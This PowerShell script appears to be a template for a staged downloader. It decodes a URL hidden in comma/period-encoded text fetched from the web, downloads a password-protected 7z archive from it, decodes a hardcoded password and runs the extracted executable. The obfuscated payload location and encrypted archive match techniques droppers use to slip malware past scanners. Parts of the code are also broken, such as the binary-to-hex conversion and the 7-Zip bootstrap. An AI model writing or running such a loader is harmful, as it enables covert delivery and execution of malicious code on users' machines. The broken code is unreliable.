# Function to convert encoded string (commas and periods) to binary
Function Convert-EncodedStringToBinary {
    Param ([string]$encodedString)
    $binaryString = $encodedString -replace ',', '0' -replace '\.', '1'
    return $binaryString
}

# Function to convert binary string to hex
Function Convert-BinaryToHex {
    Param ([string]$binaryString)
    $hexString = [convert]::ToString([convert]::ToInt32($binaryString, 2), 16)
    return $hexString
}

# Function to convert hex to ASCII text
Function Convert-HexToASCII {
    Param ([string]$hexString)
    $asciiText = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromHexString($hexString))
    return $asciiText
}

# Function to download file
Function Download-File {
    Param ([string]$url, [string]$path)
    Invoke-WebRequest -Uri $url -OutFile $path
}

# Function to download and extract 7-Zip command line version
Function DownloadAndExtract7Zip {
    $sevenZipUrl = "https://www.7-zip.org/a/7z1900-extra.7z"
    $sevenZipDownloadPath = ".\7zip.7z"
    $sevenZipExtractPath = ".\7zip"
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
    & 7z x $sevenZipDownloadPath -o$sevenZipExtractPath
}

# Function to decrypt hardcoded binary string to get password
Function Get-DecryptedPassword {
    $hardcodedBinary = "your_hardcoded_binary_string_here" # Replace with your hardcoded binary
    $binaryGroups = $hardcodedBinary -split '(?<=\G.{8})'
    $password = ($binaryGroups | ForEach-Object { [convert]::ToChar([convert]::ToInt32($_, 2)) }) -join ''
    return $password
}

# Main script
$url = "your_initial_text_url_here" # Replace this with the actual URL
$rawText = Invoke-RestMethod -Uri $url

# Decode and convert process
$binaryString = Convert-EncodedStringToBinary -encodedString $rawText
$hexString = Convert-BinaryToHex -binaryString $binaryString
$finalUrl = Convert-HexToASCII -hexString $hexString

# Download the target file
$downloadPath = ".\DownloadedFile.7z"
Download-File -url $finalUrl -path $downloadPath

# Download and extract 7-Zip
DownloadAndExtract7Zip

# Get password and unzip the downloaded file
$password = Get-DecryptedPassword
$sevenZipCmdPath = ".\7zip\7z.exe"
& $sevenZipCmdPath x $downloadPath -o".\ExtractedFile" -p$password

# Execute the extracted file
$extractedFilePath = ".\ExtractedFile\YourExecutable.exe" # Update this path as necessary
if (Test-Path -Path $extractedFilePath) {
    Invoke-Item $extractedFilePath
} else {
    Write-Error "The extracted file does not exist."
}
